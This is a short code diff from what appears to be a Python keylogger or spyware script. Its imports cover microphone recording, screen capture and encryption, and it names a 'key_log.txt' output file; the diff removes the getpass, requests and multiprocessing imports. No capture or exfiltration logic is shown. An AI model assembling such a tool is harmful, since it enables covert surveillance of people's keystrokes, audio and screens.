@@ -18,10 +18,7 @@ from scipy.io.wavfile import write  #Microphone Support
 import sounddevice as sd
 
 from cryptography.fernet import Fernet  #Encryption modules
-import getpass
-from requests import get
 
-from multiprocessing import Process,freeze_support   #Image Processing
 from PIL import ImageGrab
 
 keys_info = "key_log.txt"
